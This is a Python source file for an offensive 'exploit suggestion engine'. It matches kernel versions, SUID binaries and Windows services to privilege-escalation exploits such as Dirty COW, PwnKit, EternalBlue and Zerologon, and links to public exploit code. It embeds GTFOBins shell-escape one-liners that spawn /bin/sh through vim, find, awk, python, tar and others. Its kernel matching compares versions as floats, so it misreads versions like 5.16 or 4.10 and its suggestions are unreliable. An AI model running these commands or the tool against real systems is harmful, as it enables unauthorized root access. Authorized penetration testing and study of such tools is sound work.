"""
Advanced Exploit Suggestion Engine
Provides specific exploit recommendations with CVE mappings
"""

import re
import json
from datetime import datetime

class ExploitSuggestionEngine:
    def __init__(self):
        self.linux_exploits = {
            # Kernel exploits
            'dirty_cow': {
                'cve': 'CVE-2016-5195',
                'kernel_versions': ['2.6.22', '4.8.3'],
                'description': 'Race condition in memory subsystem',
                'exploit_code': 'https://github.com/dirtycow/dirtycow.github.io',
                'severity': 'Critical'
            },
            'dirty_pipe': {
                'cve': 'CVE-2022-0847',
                'kernel_versions': ['5.8', '5.16.11'],
                'description': 'Arbitrary file write vulnerability',
                'exploit_code': 'https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits',
                'severity': 'Critical'
            },
            'pwnkit': {
                'cve': 'CVE-2021-4034',
                'description': 'pkexec local privilege escalation',
                'exploit_code': 'https://github.com/berdav/CVE-2021-4034',
                'severity': 'Critical'
            },
            # SUID exploits
            'sudo_baron_samedit': {
                'cve': 'CVE-2021-3156',
                'description': 'Sudo heap-based buffer overflow',
                'exploit_code': 'https://github.com/blasty/CVE-2021-3156',
                'severity': 'Critical'
            }
        }
        
        self.windows_exploits = {
            'eternal_blue': {
                'cve': 'CVE-2017-0144',
                'description': 'SMBv1 remote code execution',
                'exploit_code': 'https://github.com/3ndG4me/AutoBlue-MS17-010',
                'severity': 'Critical'
            },
            'print_nightmare': {
                'cve': 'CVE-2021-34527',
                'description': 'Print Spooler privilege escalation',
                'exploit_code': 'https://github.com/cube0x0/CVE-2021-1675',
                'severity': 'Critical'
            },
            'zerologon': {
                'cve': 'CVE-2020-1472',
                'description': 'Netlogon privilege escalation',
                'exploit_code': 'https://github.com/SecuraBV/CVE-2020-1472',
                'severity': 'Critical'
            }
        }
        
        self.gtfobins_exploits = {
            'vim': 'vim -c \':!/bin/sh\'',
            'find': 'find . -exec /bin/sh \\; -quit',
            'awk': 'awk \'BEGIN {system("/bin/sh")}\'',
            'python': 'python -c \'import os; os.system("/bin/sh")\'',
            'perl': 'perl -e \'exec "/bin/sh";\'',
            'ruby': 'ruby -e \'exec "/bin/sh"\'',
            'tar': 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
            'less': 'less /etc/profile (then !/bin/sh)',
            'more': 'more /etc/profile (then !/bin/sh)'
        }
    
    def suggest_kernel_exploits(self, kernel_version, platform):
        """Suggest kernel exploits based on version"""
        suggestions = []
        
        if platform.lower() == 'linux':
            for exploit_name, exploit_info in self.linux_exploits.items():
                if 'kernel_versions' in exploit_info:
                    # Simple version matching
                    kernel_parts = kernel_version.split('.')[:2]
                    if len(kernel_parts) >= 2:
                        kernel_float = float(f"{kernel_parts[0]}.{kernel_parts[1]}")
                        
                        min_ver = float(exploit_info['kernel_versions'][0])
                        max_ver = float(exploit_info['kernel_versions'][1])
                        
                        if min_ver <= kernel_float <= max_ver:
                            suggestions.append({
                                'name': exploit_name,
                                'cve': exploit_info['cve'],
                                'description': exploit_info['description'],
                                'exploit_url': exploit_info['exploit_code'],
                                'severity': exploit_info['severity'],
                                'type': 'kernel_exploit'
                            })
        
        return suggestions
    
    def suggest_suid_exploits(self, suid_binaries):
        """Suggest SUID binary exploits"""
        suggestions = []
        
        for binary_path in suid_binaries:
            binary_name = binary_path.split('/')[-1]
            
            if binary_name in self.gtfobins_exploits:
                suggestions.append({
                    'name': f'{binary_name}_suid_exploit',
                    'binary': binary_name,
                    'path': binary_path,
                    'command': self.gtfobins_exploits[binary_name],
                    'description': f'GTFOBins SUID exploitation for {binary_name}',
                    'severity': 'Critical',
                    'type': 'suid_exploit',
                    'reference': f'https://gtfobins.github.io/gtfobins/{binary_name}/'
                })
        
        return suggestions
    
    def suggest_service_exploits(self, services, platform):
        """Suggest service-based exploits"""
        suggestions = []
        
        if platform.lower() == 'windows':
            for service in services:
                if 'unquoted' in service.get('vulnerability', '').lower():
                    suggestions.append({
                        'name': 'unquoted_service_path',
                        'service': service.get('service', 'Unknown'),
                        'description': 'Unquoted service path exploitation',
                        'command': f'Create malicious executable in path hierarchy',
                        'severity': 'High',
                        'type': 'service_exploit',
                        'reference': 'https://attack.mitre.org/techniques/T1574/009/'
                    })
        
        return suggestions
    
    def generate_exploit_report(self, findings, os_info):
        """Generate comprehensive exploit suggestions"""
        exploit_suggestions = []
        
        # Extract relevant information from findings
        kernel_version = os_info.get('kernel', '')
        platform = os_info.get('platform', '')
        
        # Kernel exploits
        if kernel_version:
            kernel_exploits = self.suggest_kernel_exploits(kernel_version, platform)
            exploit_suggestions.extend(kernel_exploits)
        
        # SUID exploits
        suid_findings = [f for f in findings if f.get('type') == 'suid']
        suid_binaries = []
        for finding in suid_findings:
            if 'path' in finding.get('details', {}):
                suid_binaries.append(finding['details']['path'])
        
        if suid_binaries:
            suid_exploits = self.suggest_suid_exploits(suid_binaries)
            exploit_suggestions.extend(suid_exploits)
        
        # Service exploits
        service_findings = [f for f in findings if f.get('type') == 'service']
        if service_findings:
            service_exploits = self.suggest_service_exploits(service_findings, platform)
            exploit_suggestions.extend(service_exploits)
        
        return exploit_suggestions
    
    def format_exploit_suggestions(self, suggestions):
        """Format exploit suggestions for display"""
        if not suggestions:
            return "No specific exploit suggestions available."
        
        output = []
        output.append("ðŸŽ¯ EXPLOIT SUGGESTIONS")
        output.append("=" * 50)
        
        for i, suggestion in enumerate(suggestions, 1):
            output.append(f"\n[{i}] {suggestion['name'].upper()}")
            output.append(f"    Severity: {suggestion['severity']}")
            output.append(f"    Description: {suggestion['description']}")
            
            if 'cve' in suggestion:
                output.append(f"    CVE: {suggestion['cve']}")
            
            if 'command' in suggestion:
                output.append(f"    Command: {suggestion['command']}")
            
            if 'exploit_url' in suggestion:
                output.append(f"    Exploit Code: {suggestion['exploit_url']}")
            
            if 'reference' in suggestion:
                output.append(f"    Reference: {suggestion['reference']}")
        
        output.append("\nâš ï¸  WARNING: Use only for authorized testing!")
        
        return "\n".join(output)